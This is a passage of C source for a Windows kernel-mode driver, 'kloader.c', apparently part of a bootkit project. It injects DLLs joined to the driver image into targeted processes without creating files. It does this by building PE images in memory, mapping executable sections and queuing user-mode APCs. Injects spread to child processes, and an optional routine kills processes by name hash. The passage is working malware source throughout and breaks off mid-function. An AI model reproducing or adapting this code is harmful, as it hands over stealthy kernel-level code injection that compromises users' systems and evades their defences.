//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project
//	
// module: kloader.c
// $Revision: 85 $
// $Date: 2012-07-20 17:17:35 +0400 (Пт, 20 июл 2012) $
// description:
//	Kernel-mode loader for user DLL images. Main module.
//	Injects an attached DLL into specified process(es) without creating a file.
//	Target DLLs are being attached to the driver image by FJ joiner utility.

#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "kloader.h"
#include "bklib.h"
#include "..\bkdrv\bkdrv.h"
#include "..\bkdrv\handle.h"

#include "pesup.h"

// Support for attached files
#include "joiner.h"

#ifdef _BK_VFS
	#include "..\fslib\fslib.h"
#endif
#ifdef	_BK_FILTER
	#include "..\bkfilter\bkfilter.h"
#endif
#ifdef	_BK_KIP
	#include "..\kiplib\kiplib.h"
#endif
#ifdef	_BK_KBOT
	#include "..\kbot\kbot.h"
#endif

// To bypass "ntoskrnl.lib(loadcfg.obj) : error LNK2001: unresolved external symbol ___security_cookie" error
//	while building with WIN7 WDK
int __security_cookie=__LINE__;


UNICODE_STRING	g_uNtdll		= RTL_CONSTANT_STRING(L"ntdll.dll");
UNICODE_STRING	g_uWowNtdll		= RTL_CONSTANT_STRING(L"wow64\\ntdll.dll");
UNICODE_STRING	g_uKernel32		= RTL_CONSTANT_STRING(L"kernel32.dll");
UNICODE_STRING	g_uKernelbase	= RTL_CONSTANT_STRING(L"kernelbase.dll");
UNICODE_STRING	g_uWow64		= RTL_CONSTANT_STRING(L"wow64.dll");
UNICODE_STRING	g_uNtdll32		= RTL_CONSTANT_STRING(L"ntdll32.dll");
UNICODE_STRING	g_uUser32		= RTL_CONSTANT_STRING(L"user32.dll");
UNICODE_STRING	g_uGdi32		= RTL_CONSTANT_STRING(L"gdi32.dll");
UNICODE_STRING  g_uWowKernel32	= RTL_CONSTANT_STRING(L"wow64\\kernel32.dll");
UNICODE_STRING	g_uExplorer		= RTL_CONSTANT_STRING(L"explorer.exe");

ANSI_STRING		g_InjectFile	= RTL_CONSTANT_STRING("\\INJECTS.SYS");

PHANDLE_TABLE	g_ActiveProcessDb	= NULL;

LIST_ENTRY		g_InjectDescriptorListHead = {&g_InjectDescriptorListHead, &g_InjectDescriptorListHead};
KSPIN_LOCK		g_InjectDescriptorListLock = {0};
KIRQL			g_InjectDescriptorOldIrql = 0;


VOID __stdcall Wow64LoadDllApcStub(VOID);

PVOID __stdcall AppAlloc(ULONG	Size)
{
	return(MyAllocatePool(PagedPool, Size));
}

VOID __stdcall AppFree(PVOID pMem)
{
	MyFreePool(pMem);
}

#ifdef	_DRIVER_SUPPORTS_UNLOAD
LONG volatile	g_WorkerEntryCount = 0;
	
#define			ENTER_WORKER()	InterlockedIncrement(&g_WorkerEntryCount)
#define			LEAVE_WORKER()	InterlockedDecrement(&g_WorkerEntryCount)

VOID	WaitWorkers(VOID)
{
	do
	{
		LARGE_INTEGER	Period = {0};
		Period.QuadPart = _RELATIVE(_MILLISECONDS(100));
		KeDelayExecutionThread(KernelMode, TRUE, &Period);
	} while(g_WorkerEntryCount);
}

#else

#define			ENTER_WORKER()	
#define			LEAVE_WORKER()	
#define			WaitWorkers()

#endif


// ---- Pid context stubs -------------------------------------------------------------------------------------------------
_inline PPID_CONTEXT PidCreateContext(HANDLE Key)
{
	PPID_CONTEXT	PidCtx;
	if (!HandleCreate(g_ActiveProcessDb, Key, &PidCtx))
		PidCtx = NULL;

	return(PidCtx);
}

_inline	PPID_CONTEXT PidGetContext(HANDLE Key)
{
	PPID_CONTEXT	PidCtx;
	if (!HandleOpen(g_ActiveProcessDb, Key, &PidCtx))
		PidCtx = NULL;
	return(PidCtx);
}

#define PidReleaseContext(PidCtx)	HandleClose(g_ActiveProcessDb, NULL, CONTAINING_RECORD(PidCtx, HANDLE_RECORD, Context))
#define	PidDeleteContext(PidCtx)	HandleClose(g_ActiveProcessDb, NULL, CONTAINING_RECORD(PidCtx, HANDLE_RECORD, Context))


// ---- Inject descriptor list stubs ----------------------------------------------------------------------------------------

VOID	LockInjectDescriptorList(VOID)
{
	KIRQL	Irql;
	KeAcquireSpinLock(&g_InjectDescriptorListLock, &Irql);
	g_InjectDescriptorOldIrql = Irql;
}


VOID	UnlockInjectDescriptorList(VOID)
{
	KeReleaseSpinLock(&g_InjectDescriptorListLock, g_InjectDescriptorOldIrql);
}


// ---- Miscellaneous routines ----------------------------------------------------------------------------------------------

//
//	Compares names of two modules. Returns TRUE if the names are equal.
static BOOL	EqualModuleName(PUNICODE_STRING ModuleName, PUNICODE_STRING OtherName)
{
	BOOL Ret = FALSE;

	if (ModuleName && (ModuleName->Length >= OtherName->Length))
	{
		UNICODE_STRING	ShortName;
		ShortName.Length = OtherName->Length;
		ShortName.MaximumLength = OtherName->Length;
		ShortName.Buffer = (PWSTR)((PCHAR)ModuleName->Buffer + ModuleName->Length - ShortName.Length);
		Ret = (BOOL)RtlEqualUnicodeString(&ShortName, OtherName, TRUE);
	}
	return(Ret);
}

//
//	Returns full path of the main module of the process specified by ProcessId.
static NTSTATUS	GetProcessImagePath(
							IN	HANDLE ProcessId, 
							OUT PUNICODE_STRING ImagePath
							)
{
	ULONG		bSize;
	NTSTATUS	ntStatus;
	HANDLE		hProcess;
	CLIENT_ID	ClientId = {0};
	OBJECT_ATTRIBUTES	oa = {0};

	ClientId.UniqueProcess = ProcessId;
	InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	if (NT_SUCCESS(ZwOpenProcess(&hProcess, GENERIC_READ, &oa, &ClientId)))
	{		
		ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, NULL, 0, &bSize);
		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		{
			PUNICODE_STRING	ProcessFullName = (PUNICODE_STRING)MyAllocatePool(PagedPool, bSize);
			if (ProcessFullName)
			{
				ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, ProcessFullName, bSize, &bSize);
				if (NT_SUCCESS(ntStatus))
				{
					if (ImagePath->Buffer = MyAllocatePool(NonPagedPool, ProcessFullName->MaximumLength))
					{
						RtlCopyMemory(ImagePath->Buffer, ProcessFullName->Buffer, ProcessFullName->Length);
						ImagePath->Length = ProcessFullName->Length;
						ImagePath->MaximumLength = ProcessFullName->MaximumLength;
					}
					else
						ntStatus = STATUS_INSUFFICIENT_RESOURCES;
				}	// if (NT_SUCCESS(ntStatus))
				MyFreePool(ProcessFullName);
			}	// if (ProcessFullName)
		}	// if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		ZwClose(hProcess);
	}	// if (NT_SUCCESS(ZwOpenProcess(&hProcess, GENERIC_READ, &oa, &ClientId)))

	return(ntStatus);
}


static ULONG ModuleNameCrc32A(PANSI_STRING aModuleName)
{
	ULONG	i = aModuleName->Length;
	ULONG	Hash;

	RtlUpperString(aModuleName, aModuleName);
	while(i > 0 && aModuleName->Buffer[i - 1] != '\\') i--;
	Hash = BkCRC32(&aModuleName->Buffer[i], aModuleName->Length - i);

	return(Hash);
}

static ULONG ModuleNameCrc32U(PUNICODE_STRING uModuleName)
{
	ULONG			Hash = 0;
	ANSI_STRING		aName;

	if (uModuleName->Length)
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&aName, uModuleName, TRUE)))
		{
			Hash = ModuleNameCrc32A(&aName);
			RtlFreeAnsiString(&aName);
		}	// if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&aName, ModuleName, TRUE)))
	}	// if (ModuleName->Length)
	return(Hash);
}


//
//	References the process object by the specified ID.
HANDLE	OpenProcessById(HANDLE ProcessId, ACCESS_MASK AccessMask)
{
	HANDLE		hProcess;
	CLIENT_ID	ClientId = {0};
	OBJECT_ATTRIBUTES	oa = {0};

	ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);

	ClientId.UniqueProcess = ProcessId;
	InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	if (!(NT_SUCCESS(ZwOpenProcess(&hProcess, AccessMask, &oa, &ClientId))))
		hProcess = NULL;

	return(hProcess);
}

//
// Returns TRUE if the specified process ID belongs to a WOW64 process.
static	BOOL	IsWow64Process(HANDLE	ProcessId)
{
	BOOL	Ret = FALSE;
	HANDLE	hProcess = OpenProcessById(ProcessId, GENERIC_READ);
	PVOID	ProcessWow64Info = NULL;

	if (hProcess)
	{	
		NTSTATUS ntStatus = ZwQueryInformationProcess(hProcess, ProcessWow64Information, &ProcessWow64Info, sizeof(PVOID), NULL);
		if (NT_SUCCESS(ntStatus) && ProcessWow64Info != NULL)
			Ret = TRUE;

		ZwClose(hProcess);
	}	// if (hProcess)

	return(Ret);
}

//
//	Allocates and initialize new INJECT_DESCRIPTOR structure.
//
PINJECT_DESCRIPTOR	AllocateInjectDescriptor(
	ULONG	ProcessHash,		// target process name hash
	ULONG	ModuleId,			// ID of the module to inject (typicaly it's name hash)
	PVOID	Module,				// module to inject
	ULONG	AttachCount,		// number of attach attempts
	ULONG	Flags				// various flags
	)
{
	PINJECT_DESCRIPTOR	InjDesc = (PINJECT_DESCRIPTOR)MyAllocatePool(NonPagedPool, sizeof(INJECT_DESCRIPTOR));

	ASSERT(Module);

	if (InjDesc)
	{
		RtlZeroMemory(InjDesc,  sizeof(INJECT_DESCRIPTOR));
#if _DBG
		InjDesc->Magic = INJECT_DESCRIPTOR_MAGIC;
#endif
		InitializeListHead(&InjDesc->InjectListEntry);
		InitializeListHead(&InjDesc->ProcessListEntry);
		InjDesc->Flags |= Flags;
		InjDesc->AttachCount = AttachCount;
		InjDesc->InjectModuleId = ModuleId;

		if (ProcessHash)
		{
			InjDesc->TargetProcessHash = ProcessHash;
			InjDesc->Flags |= INJECT_SPECIFIED_PROCESS;
		}

		if (Flags & INJECT_SPECIFIED_MODULE)
		{
			// Injecting specified module (has a path)
			InjDesc->InjectModulePath = (PUNICODE_STRING)Module;
		}
		else
		{
			// Injecting from memory buffer
			InjDesc->InjectModuleBuffer = Module;
		}

	}	// if (InjDesc)
	return(InjDesc);

}


//
//	Inserts specified INJECT_DESCRIPTOR into global inject descriptor list.
VOID	InsertInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->AttachCount != 0);
	ASSERT(InjDesc->ReferenceCount == 0);

	LockInjectDescriptorList();
	InjDesc->ReferenceCount = 1;
	InsertTailList(&g_InjectDescriptorListHead, &InjDesc->InjectListEntry);
	UnlockInjectDescriptorList();
}


//
//	Releases specified INJECT_DESCRIPTOR structure.
VOID	ReleaseInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->ReferenceCount == 0);

	if (InjDesc->InjectModulePath)
		MyFreePool(InjDesc->InjectModulePath);
		
	if (InjDesc->InjectModuleBuffer)
		MyFreePool(InjDesc->InjectModuleBuffer);

	MyFreePool(InjDesc);
}

//
//	Decrements INJECT_DESCRIPTOR reference count. Releases INJECT_DESCRIPTOR when reference count reaches 0.
VOID	DereferenceInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->ReferenceCount > 0);

	if (InterlockedDecrement(&InjDesc->ReferenceCount) == 0 && InjDesc->AttachCount == 0)
		ReleaseInjectDescriptor(InjDesc);
}


// ---- Loader APC stubs --------------------------------------------------------------------------------------------------


VOID _stdcall MyKernelApcRoutine(
	PKAPC	Apc,
	PKNORMAL_ROUTINE* NormalRoutine,
	PVOID	NormalContext,
	PVOID	SystemArgument1,
	PVOID	SystemArgument2	
	)
{
	MyFreePool(Apc);

	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
}

// --------------------------------------------------------------------------------------------------------------------------
#ifdef _BK_KILL_PROCESS

//
//	Searches for the process with the specified name hash and terminates it.
//
NTSTATUS SearchAndKillProcess(
	ULONG	ProcessNameHash
	)
{
	ULONG	Size = 0x10000;
	NTSTATUS	ntStatus;	
	PSYSTEM_PROCESS_INFORMATION	pProcInfo0, pProcInfo;

	do	// Query system information loop
	{
		if (!(pProcInfo = MyAllocatePool(PagedPool, Size)))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		ntStatus = ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcInfo, Size, &Size);

		if (NT_SUCCESS(ntStatus))
			break;
		else
		{
			MyFreePool(pProcInfo);
		}
	} while(TRUE);


	if (NT_SUCCESS(ntStatus))
	{
		pProcInfo0 = pProcInfo;
		ntStatus = STATUS_OBJECT_NAME_NOT_FOUND;

		do	// enumerating processes
		{
			if (pProcInfo->NumberOfThreads)
			{
				// Comparing process name hash
				if (ProcessNameHash == ModuleNameCrc32U(&pProcInfo->ImageName))
				{
					// Obtaining process handle
					HANDLE	hProcess = OpenProcessById(pProcInfo->UniqueProcessId, GENERIC_ALL);
					if (hProcess)
					{
						// Terminating the process
						ntStatus = ZwTerminateProcess(hProcess, STATUS_SUCCESS);
						ZwClose(hProcess);
					}
				}	// if (ProcessNameHash == ModuleNameCrc32U(&pProcInfo->ImageName))
			}	// if (pProcInfo->NumberOfThreads)
		} while(pProcInfo->NextEntryOffset && ((PCHAR)pProcInfo += pProcInfo->NextEntryOffset));

		MyFreePool(pProcInfo0);
	}	// if (NT_SUCCESS(ntStatus))

	return(ntStatus);
}


#endif	// _BK_KILL_PROCESS

//
//	Builds PE image from a PE file
BOOL	LoaderBuildImage(
					PCHAR NewBase,			// New PE image base
					PCHAR ModuleBuffer		// buffer containing PE file
					)
{
	BOOL	Ret = TRUE;
	ULONG	i, NumberSections, FileAlign, bSize;
	PIMAGE_NT_HEADERS	Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBuffer);
	PIMAGE_SECTION_HEADER	Section = IMAGE_FIRST_SECTION(Pe);
	PIMAGE_DATA_DIRECTORY	DataDir;
	LONG	RelocSize;

	NumberSections	= Pe->FileHeader.NumberOfSections;
	FileAlign		= PeSupGetOptionalField(Pe, FileAlignment);
	
	RtlCopyMemory(NewBase, ModuleBuffer, PeSupGetOptionalField(Pe, SizeOfHeaders));

	// Copying sections
	for(i=0; i<NumberSections; i++)
	{
		bSize = PeSupAlign(Section->SizeOfRawData, FileAlign);
		if (bSize)
			RtlCopyMemory(NewBase + Section->VirtualAddress, ModuleBuffer + Section->PointerToRawData, bSize);
		Section += 1;
	}

	// Processing relocs
	DataDir = PeSupGetDirectoryEntryPtr(Pe, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (DataDir->VirtualAddress && (RelocSize = DataDir->Size))
	{
		ULONG_PTR	BaseDelta = ((ULONG_PTR)NewBase - (ULONG_PTR)PeSupGetOptionalField(Pe, ImageBase));
		PIMAGE_BASE_RELOCATION_EX	Reloc = (PIMAGE_BASE_RELOCATION_EX)(NewBase + DataDir->VirtualAddress);

		while(RelocSize > IMAGE_SIZEOF_BASE_RELOCATION)
		{
			ULONG	NumberRelocs = (Reloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(WORD);
			PCHAR	PageVa = NewBase + Reloc->VirtualAddress;

			if (RelocSize >= (LONG)Reloc->SizeOfBlock)
			{
				for (i=0; i<NumberRelocs; i++)
				{
					USHORT	RelocType = (Reloc->TypeOffset[i] >> IMAGE_REL_BASED_SHIFT);

					switch(RelocType)
					{
					case IMAGE_REL_BASED_ABSOLUTE:
						// Do nothing. This one is used just for alingment.
						break;
					case IMAGE_REL_BASED_HIGHLOW:
						*(PULONG)(PageVa + (Reloc->TypeOffset[i] & IMAGE_REL_BASED_MASK)) += (ULONG)BaseDelta;
						break;
#ifdef _M_AMD64
					case IMAGE_REL_BASED_DIR64:
						*(PULONG_PTR)(PageVa + (Reloc->TypeOffset[i] & IMAGE_REL_BASED_MASK)) += BaseDelta;
						break;
#endif
					default:
						ASSERT(FALSE);
						break;
					}	// switch(RelocType)
				}	// for (i=0; i<NumberRelocs; i++)
			}	// if (RelocSize >= (LONG)Reloc->SizeOfBlock)
			RelocSize -= (LONG)Reloc->SizeOfBlock;
			Reloc = (PIMAGE_BASE_RELOCATION_EX)((PCHAR)Reloc + Reloc->SizeOfBlock);
		}	// while(RelocSize > IMAGE_SIZEOF_BASE_RELOCATION)
	}	// if (!ImageAtBase && DataDir->VirtualAddress && (RelocSize = DataDir->Size)
	return(Ret);
}


//
//	Creates a section object of the specified size and maps it into the current process.
//
PCHAR	LoaderAllocateSection(
	ULONG	SizeOfSection
	)
{
	HANDLE		hSection	= 0;
	SIZE_T		ViewSize	= 0;
	NTSTATUS	ntStatus	= STATUS_SUCCESS;
	PVOID		SectionBase	= NULL;
	OBJECT_ATTRIBUTES	oa = {0};
	LARGE_INTEGER		SectionSize = {0}, SectionOffset = {0};

	SectionSize.LowPart = SizeOfSection;
	ASSERT(SectionSize.QuadPart == (ULONGLONG)SectionSize.LowPart);

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, 0, NULL);
	ntStatus = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, &SectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwMapViewOfSection(hSection, NtCurrentProcess(), &SectionBase, 0, SectionSize.LowPart, &SectionOffset, 
			&ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);

		if (NT_SUCCESS(ntStatus))
		{
			KdPrint(("KLDR: Image section for DLL mapped within process %x at %p\n", PsGetCurrentProcessId(), SectionBase));
			RtlZeroMemory(SectionBase, SectionSize.LowPart);
		}	// if (NT_SUCCESS(ntStatus))
		else
		{
			KdPrint(("KLDR: Failed mapping an image section to process %x, status 0x%x\n", PsGetCurrentProcessId(), ntStatus));
		}
	}	// if (NT_SUCCESS(ntStatus))

	if (hSection)
		ZwClose(hSection);

	return((PCHAR)SectionBase);
}


//
//	Allocates and initializes loader-specific context.
//
PLOADER_CONTEXT LoaderAllocateContext(
	HANDLE	ProcessId, 
	PINJECT_DESCRIPTOR InjDesc, 
	BOOL	IsWow64
	)
{
	NTSTATUS	ntStatus;
	HANDLE		hProcess;
	PLOADER_CONTEXT	LdrCtx = NULL;
	PCHAR		ImageBase;
	ULONG		SizeOfImage = 0, SizeOfSection = sizeof(LOADER_CONTEXT) + LOADER_PATH_MAX + sizeof(WCHAR);

	if (!(InjDesc->Flags & INJECT_SPECIFIED_MODULE))
	{
		PIMAGE_NT_HEADERS	Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(InjDesc->InjectModuleBuffer);
		SizeOfImage = _ALIGN(PeSupGetOptionalField(Pe, SizeOfImage), PAGE_SIZE);
		SizeOfSection += SizeOfImage;
	}
	
	if (ImageBase = LoaderAllocateSection(SizeOfSection))
	{
		PCHAR	CurrentStub = (PCHAR)&LoadDllApcStub;
#ifdef _M_AMD64
		if (IsWow64)
		{
			CurrentStub = (PCHAR)&LoadDllApcStubWow64;
		}
#endif

		LdrCtx = (PLOADER_CONTEXT)(ImageBase + SizeOfImage);

		RtlCopyMemory(&LdrCtx->LoaderStub, CurrentStub, LOADER_STUB_MAX);
		LdrCtx->uDllPath.Buffer = (PWSTR)&LdrCtx->wDllPath;
		LdrCtx->Flags = InjDesc->Flags;

		KdPrint(("KLDR: Loader stub for process %x located at 0x%p\n", ProcessId, &LdrCtx->LoaderStub));

		if (InjDesc->Flags & INJECT_SPECIFIED_MODULE)
		{
			// Injecting from a file
			RtlCopyMemory(&LdrCtx->wDllPath, InjDesc->InjectModulePath->Buffer, InjDesc->InjectModulePath->Length);
			LdrCtx->uDllPath.Length = InjDesc->InjectModulePath->Length;
			LdrCtx->uDllPath.MaximumLength = InjDesc->InjectModulePath->Length;
			LdrCtx->wDllPath[LdrCtx->uDllPath.Length/sizeof(WCHAR)] = 0;
		}
		else
		{
			// Injecting from a buffer
			LdrCtx->ImageBase = (ULONGLONG)ImageBase;

			// Initializing PE images
			if (!LoaderBuildImage(ImageBase, InjDesc->InjectModuleBuffer))
			{
				ZwUnmapViewOfSection(NtCurrentProcess(), ImageBase);
				LdrCtx = NULL;
			}
		}
	}	// if (ImageBase = LoaderAllocateSection(bSize))
	return(LdrCtx);
}

//
//	Queues loader APC.
BOOL KldrQueueApc(
	PETHREAD	TargetThread,
	PVOID		ApcRoutine,
	PVOID		ApcContext, 
	BOOL		IsWow64
	)
{
	PKAPC	Apc;
	BOOL	Ret = FALSE;
	LARGE_INTEGER Period = {0}; 

	if (Apc = MyAllocatePool(NonPagedPool, sizeof(KAPC)))
	{
		KeInitializeApc(
			Apc, 
			(PKTHREAD)TargetThread, 
			OriginalApcEnvironment, 
			&MyKernelApcRoutine, 
			NULL, 
			(PKNORMAL_ROUTINE)ApcRoutine,
			UserMode, 
			ApcContext
			); 
						
		if ((Ret = KeInsertQueueApc(Apc, NULL, NULL, 0)) && !IsWow64)
			KeDelayExecutionThread(UserMode, TRUE, &Period);
			
	}	// if (Apc = MyAllocatePoolWithTag(

	return(Ret);
}


//
//	Initializes inject APC stub and loader-specific context.
BOOL InjectInitializeStub(HANDLE ProcessId, PINJECT_CONTEXT InjCtx, FUNC_PROTECT_MEM pZwProtectVirtualMemory, BOOL IsWow64)
{
	BOOL	Ret = FALSE;

	if (InjCtx->LdrCtx = LoaderAllocateContext(ProcessId, InjCtx->InjDesc, IsWow64))
	{
		InjCtx->ApcRoutine = &InjCtx->LdrCtx->LoaderStub;
		InjCtx->ApcContext = InjCtx->LdrCtx;
		InjCtx->Flags |= INJECT_STATE_WAITING_APC;						
		Ret = TRUE;
	}	// if (InjCtx->LdrCtx = LoaderAllocateContext(ProcessId, InjCtx->InjDesc, IsWow64))
	return(Ret);
}


//
//	Resolves all necessary NTDLL imports.
//
BOOL	ResolveNtdllImport(
	PCHAR	NtdllBase, 
	PPROCESS_IMPORT	Import
	)
{
	BOOL	Ret = FALSE;

	do	// not a loop
	{
		if (!(Import->pLdrLoadDll = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "LdrLoadDll")))
		{
			KdPrint(("KLDR: NTDLL!LdrLoadDll not resolved!\n"));
			break;
		}

		if (!(Import->pLdrGetProcedureAddress = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "LdrGetProcedureAddress")))
		{
			KdPrint(("KLDR: NTDLL!LdrGetProcedureAddress not resolved!\n"));
			break;
		}

		if (!(Import->pNtProtectVirtualMemory = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "NtProtectVirtualMemory")))
		{
			KdPrint(("KLDR: NTDLL!NtProtectVirtualMemory not resolved!\n"));
			break;
		}

		Ret = TRUE;
	} while(FALSE);

	return(Ret);
}


//
//	Attaches specified INJECT_DESCRIPTOR to the specified PID_CONTEXT. Increments INJECT_DESCRIPTOR's reference count.
//
VOID	AttachInjectDescriptor(
	PPID_CONTEXT	PidCtx, 
	PINJECT_DESCRIPTOR	InjDesc
	)
{
	ASSERT(PidCtx->InjectCount < MAX_INJECTS_PER_PROCESS);

	InterlockedIncrement(&InjDesc->ReferenceCount);
	if (InterlockedDecrement(&InjDesc->AttachCount) == 0)
		RemoveEntryList(&InjDesc->InjectListEntry);
							
	PidCtx->InjectContext[PidCtx->InjectCount].InjDesc = InjDesc;
	PidCtx->InjectCount += 1;
}


//
//	Attaches the specified inject descriptor to the specified process.
//	Creates new PID_CONTEXT for the process if it is not exists yet.
//
BOOL	PidAttachInjectDescriptor(
	HANDLE	ProcessId,
	PINJECT_DESCRIPTOR	InjDesc,
	BOOL	IsWow64
	)
{
	BOOL Ret = FALSE, Reused = FALSE;
	PPID_CONTEXT PidCtx;

	if (!(PidCtx = PidCreateContext(ProcessId)))
	{
		PidCtx = PidGetContext(ProcessId);
		Reused = TRUE;
	}

	if (PidCtx)
	{
		AttachInjectDescriptor(PidCtx, InjDesc);

#ifdef _M_AMD64
		if (IsWow64)
			PidCtx->Flags |= INJECT_WOW64_PROCESS;
#endif
		if (Reused)
			// Context was created earlier and currently reused
			PidReleaseContext(PidCtx);
		Ret = TRUE;
	}	// if (PidCtx)

	return(Ret);
}


//
//	Searches for apropriate INJECT_DESCRIPTOR for the specified target process ID.
//	Tries to attach found INJECT_DESCRIPTOR to a process PID_CONTEXT structure.
//
BOOL	FindAttachInjectDescriptor(
	HANDLE	ProcessId,					// target process ID
	HANDLE	ParentId,					// parent process ID
	PUNICODE_STRING	ProcessImagePath	// full path to the target process image file
	)
{
	PLIST_ENTRY		pEntry;
	PPID_CONTEXT	PidCtx;
	PINJECT_DESCRIPTOR	InjDesc;
	BOOL	Ret = FALSE;
	ULONG	i, ProcessNameHash;
	BOOL	IsWow64 = FALSE;

	if (ProcessNameHash = ModuleNameCrc32U(ProcessImagePath))
	{

#ifdef _M_AMD64
		IsWow64 = IsWow64Process(ProcessId);
#endif

		LockInjectDescriptorList();
		pEntry = g_InjectDescriptorListHead.Flink;
		while(pEntry != &g_InjectDescriptorListHead)
		{
			InjDesc = CONTAINING_RECORD(pEntry, INJECT_DESCRIPTOR, InjectListEntry);
			pEntry = pEntry->Flink;

			if (!(InjDesc->Flags & INJECT_SPECIFIED_PROCESS) || (InjDesc->TargetProcessHash == ProcessNameHash))
				Ret = PidAttachInjectDescriptor(ProcessId, InjDesc, IsWow64);
		}	// while(pEntry != &g_InjectDescriptorListHead)

		// Looking for the process tree injects specified for the parent process,
		//  propagating such injects to the child.
		if (PidCtx = PidGetContext(ParentId))
		{
			for (i=0; i<PidCtx->InjectCount; i++)
			{
				InjDesc = PidCtx->InjectContext[i].InjDesc;
				if (InjDesc->Flags & INJECT_PROCESS_TREE)
					Ret = PidAttachInjectDescriptor(ProcessId, InjDesc, IsWow64);
			}
			PidReleaseContext(PidCtx);
		}	// if (PidCtx = PidGetContext(ParentId))

		UnlockInjectDescriptorList();
	}	// if (ProcessNameHash = ModuleNameCrc32U(ProcessImagePath))
	return(Ret);
}


// ---- KLDR API ------------------------------------------------------------------------------------------------------------

//
//	Creates and initializes inject descriptor for the specfied DLL to inject it into the specified list of processes.
//
NTSTATUS KldrAddInject(
	PCHAR	VfsDllName,		// VFS-based DLL path
	PCHAR	ProcessList,	// list of names of the processes to inject the DLL to
	PCHAR	pImageBuffer,	// (OPTIONAL) memory buffer containing pre-loaded image file 
	ULONG	ImageSize,		// size of the memory buffer in bytes
	ULONG	Flags,			// various inject flags
	ULONG	AttachCount		// number of inject attempts
	)
{
	NTSTATUS	ntStatus;
	PCHAR		Buffer = NULL;
	ULONG		NameHash, ImageId, Size, Len;
	ANSI_STRING	aDllName, aProcessName;
	PIMAGE_NT_HEADERS	Pe;
	PIMAGE_DOS_HEADER	Mz;
	PINJECT_DESCRIPTOR	InjDesc;

	RtlInitAnsiString(&aDllName, VfsDllName);

	KdPrint(("KLDR: AddInject: \"%s\" to \"%s\"\n", VfsDllName, ProcessList));

	do
	{
		if (pImageBuffer && ImageSize)
		{
			// Using pre-loaded file
			Buffer = pImageBuffer;
			Size = ImageSize;
		}
		else
		{
			// Loading the specified DLL file
			ntStatus = FsLoadFile(&aDllName, &Buffer, &Size);
			if (!NT_SUCCESS(ntStatus))
			{
				// Looking if the requested DLL file is joind to the current driver
				ULONG	ImageId = ModuleNameCrc32A(&aDllName);

				if (!GetJoinedData(GetCurrentImageBase(), &Buffer, &Size, FALSE, ImageId, 0) &&
					!GetJoinedData(GetCurrentImageBase(), &Buffer, &Size, TRUE, ImageId, 0))
					break;
			}	// if (!NT_SUCCESS(ntStatus))
		}

		// Analyzing the file
		if (Size < sizeof(IMAGE_DOS_HEADER) || 
			*(PUSHORT)Buffer != IMAGE_DOS_SIGNATURE ||
			Size < ((Mz = (PIMAGE_DOS_HEADER)Buffer)->e_lfanew + sizeof(PIMAGE_NT_HEADERS))	||
			(Pe = (PIMAGE_NT_HEADERS)(Buffer + Mz->e_lfanew))->Signature != IMAGE_NT_SIGNATURE ||
#ifndef	_WIN64
			Pe->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 ||
#endif
			!(Pe->FileHeader.Characteristics & IMAGE_FILE_DLL))
		{
			ntStatus = STATUS_INVALID_IMAGE_FORMAT;
			break;
		}

		if (Pe->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
			Flags |= INJECT_AMD64_PROCESS;
		else if (Pe->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
		{
			ntStatus = STATUS_INVALID_IMAGE_FORMAT;
			break;
		}

		// Generating DLL image Id
		if (!(ImageId = ModuleNameCrc32A(&aDllName)))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		if (AttachCount == 0)
			AttachCount = ATTACH_COUNT_MAX;

		ntStatus = STATUS_INVALID_PARAMETER;

		// Parsing the list of the target processes
		while(ProcessList && ProcessList[0] != 0)
		{
			PCHAR	pStr, pStr1;
			ProcessList = strtrim(ProcessList, " \t");

			pStr = strchr(ProcessList, ' ');
			pStr1 = strchr(ProcessList, 9);

			if (!pStr || (pStr1 && pStr1 < pStr))
				pStr = pStr1;

			if (pStr)
			{
				pStr[0] = 0;
				pStr += 1;
			}

			RtlInitAnsiString(&aProcessName, ProcessList);
			NameHash = ModuleNameCrc32A(&aProcessName);

			if (InjDesc = AllocateInjectDescriptor(NameHash, ImageId, Buffer, AttachCount, Flags))
			{
				InsertInjectDescriptor(InjDesc);
#ifdef _BK_KILL_PROCESS
